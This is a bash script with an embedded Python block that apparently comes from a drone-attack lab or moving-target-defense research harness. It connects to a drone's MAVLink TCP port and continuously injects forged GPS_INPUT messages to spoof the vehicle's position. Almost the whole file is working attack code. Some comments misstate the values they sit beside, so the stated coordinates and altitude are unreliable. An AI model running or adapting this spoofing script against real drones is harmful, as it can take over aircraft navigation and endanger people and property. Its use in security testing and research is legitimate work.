#!/usr/bin/env bash
# Auto-generated from: GPS-Data-Injection.md
set -euo pipefail

# MTD_INTERFACE_START
# =======================================================================
# MTD 환경 변수를 통한 동적 타겟 획득
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입에 따라 TARGET_PORT 기본값 설정
# GPS Injection은 보통 MAVLink TCP 포트 5760을 통해 연결을 시도합니다.
case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
  DRONE_MAVLINK_TCP)
    TARGET_PORT="${TARGET_PORT:-5760}" # 기본 MAVLink TCP 포트
    ;;
  DRONE_MAVLINK)
    TARGET_PORT="${TARGET_PORT:-14550}" # 일반 MAVLink UDP 포트 (예비)
    ;;
  *)
    :
    ;;
esac

echo "[INFO] Attack target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
# MTD_INTERFACE_END

# 기준 경로 및 로깅 설정
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }; export -f log
fi

log "[ATTACK] id=gps-data-injection src=GPS-Data-Injection.md"
log "[BLOCK 1] type=python (Inline GPS Spoofing Script)"

# MAVLink GPS_INPUT 메시지 주입을 위한 Python 인라인 스크립트 실행
python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os, sys
import time
from pymavlink import mavutil

# --- Argument Parsing from Shell ---
# Orchestrator가 주입한 TARGET_IP:TARGET_PORT를 인수로 받습니다.
if len(sys.argv) <= 1:
    # Fallback/Debug: 인수가 누락되었을 경우 환경 변수 사용 시도
    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
    target_port = os.environ.get('TARGET_PORT', '5760')
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

try:
    target_ip, target_port_str = sys.argv[1].split(':', 1)
    target_port = int(target_port_str)
except Exception as e:
    print(f"[ERROR] Invalid target address format: {sys.argv[1]}. Error: {e}", file=sys.stderr)
    sys.exit(1)
# -----------------------------------

def inject_fake_gps(ip: str, port: int):
    # 동적 IP/Port 및 TCP 연결을 사용합니다.
    connection_string = f'tcp:{ip}:{port}'
    print(f"[INFO] Connecting to drone via {connection_string}")
    try:
        mav = mavutil.mavlink_connection(connection_string)
        mav.wait_heartbeat()
        print("[INFO] Connected to drone. Starting GPS injection loop.")
    except Exception as e:
        print(f"[ERROR] Failed to connect: {e}", file=sys.stderr)
        return

    while True:
        # GPS_INPUT 메시지 (GPS 스푸핑 데이터) 전송
        mav.mav.gps_input_send(
            time_usec=int(time.time() * 1e6),
            gps_id=1,  # 보조 GPS (Secondary GPS)
            ignore_flags=0,
            time_week=0,
            time_week_ms=0,
            fix_type=3, # 3D fix
            lat=473566100, # 약 47.3566100도
            lon=854619300, # 약 8.54619300도
            alt=500, # 고도 50m
            hdop=50,
            vdop=50,
            vn=0, ve=0, vd=0,
            speed_accuracy=0,
            horiz_accuracy=0,
            vert_accuracy=0,
            satellites_visible=10,
            yaw=0
        )
        time.sleep(1)

if __name__ == "__main__":
    inject_fake_gps(target_ip, target_port)
PY

log "[BLOCK 2] type=control (Foreground Execution)"
log "Attack running in foreground Python loop; orchestrator is responsible for lifecycle (SIGTERM/timeout)."